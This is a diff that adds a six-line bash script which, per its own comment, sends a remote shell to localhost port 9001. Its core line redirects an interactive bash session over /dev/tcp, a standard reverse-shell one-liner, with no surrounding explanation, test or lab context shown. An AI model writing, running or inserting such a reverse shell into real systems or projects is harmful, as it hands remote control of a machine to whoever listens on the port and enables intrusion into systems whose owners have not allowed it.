@@ -1,0 +1,6 @@
+#!/bin/bash
+
+# sends a remote shell to localhost port 9001
+bash -i >& /dev/tcp/localhost/9001 0>&1
+
+exit 0
